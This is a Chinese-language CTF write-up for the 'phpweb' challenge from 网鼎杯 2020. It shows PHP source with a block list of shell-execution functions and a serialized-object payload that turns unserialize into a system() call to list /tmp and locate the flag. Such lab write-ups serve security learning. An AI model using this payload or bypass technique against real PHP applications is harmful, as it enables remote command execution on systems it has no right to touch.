# \[网鼎杯 2020 朱雀组]phpweb

## \[网鼎杯 2020 朱雀组]phpweb

## 考点

* PHP代码执行
* PHP反序列化

## wp

burp抓包发现显示报错信息

![](../.gitbook/assets/image\_s75G2mQJRECdxqH5RSYjtB.png)

试着去修改POST内容，发现后端使用的是call\_user\_func这个函数

![](../.gitbook/assets/image\_uSxNKFfmSx2r3FMxcaicbN.png)

POST内容func=readfile\&p=index.php可以获取源码

```php
<?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
```

命令执行ban了很多函数，然后给了一个Test类，表面上是个命令执行，实际上是个反序列化是吧

POST数据`func=unserialize&p=O:4:"Test":2:{s:1:"p";s:7:"ls /tmp";s:4:"func";s:6:"system";}`

flag四处找一下就可以发现，一般就网站根目录，根目录，home目录，tmp目录

最后读取flag

![](../.gitbook/assets/image\_fcfoJ6nrbqQXseCcNJpcqB.png)

## 小结

1. 多抓包看请求内容
